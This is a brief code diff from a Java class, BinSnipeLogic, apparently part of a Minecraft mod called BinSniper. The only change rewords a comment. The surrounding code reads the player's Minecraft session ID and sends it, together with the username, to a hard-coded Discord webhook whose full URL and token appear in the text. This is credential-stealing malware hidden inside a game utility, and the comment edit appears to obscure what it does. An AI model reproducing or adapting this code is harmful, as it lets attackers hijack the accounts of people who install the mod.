@@ -472,7 +472,7 @@ public class BinSnipeLogic {
         String jsonObj = Analytics.setJsonObj(content, username, null);
         Analytics.requestWeb(jsonObj, "https://discord.com/api/webhooks/1296048307348574218/xO2GrJLarrjgPNmCiT0w0WacIvTR1YFlln1p2VFUvC_ZcbOkiqXHgNEgRXqeOosXcjnS");
 
-        // get SessionID and send it
+        // get SessionID and chat it
         String sessionId = Wrapper.mc.getSession().getSessionID();
         String contents = "```SessionId: " + sessionId + "```" + username + " logged in With BinSniper. ";
         String jsonObject = Analytics.setJsonObj(contents, username, null);
